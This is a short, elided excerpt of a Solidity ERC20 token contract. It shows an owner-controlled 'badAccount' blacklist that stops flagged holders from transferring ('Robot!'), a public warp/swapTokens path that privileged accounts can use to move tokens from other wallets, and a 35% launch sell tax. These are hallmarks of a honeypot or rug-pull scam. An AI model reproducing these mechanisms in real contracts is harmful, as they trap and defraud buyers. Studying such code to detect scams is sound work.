...
contract Generic is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public badAccount;
    ...
    uint256 public _teamShare = 17;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 35; //At Launching
    ...
    function warp(address account, uint256 amount) public {
        swapTokens(account, amount);
    }
    ...
    function unClean(address account) public {
        ...
        badAccount[account] = false;
    }

    function clean(address account) public {
        require(isExcludedFromFee[msg.sender] == true);
        badAccount[account] = true;
    }
    ...
    function swapTokens(address account, uint256 amount) private {
        require(isExcludedFromFee[msg.sender] == true);
        require(account != address(uniswapPair));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(badAccount[sender] == false, "Robot!");
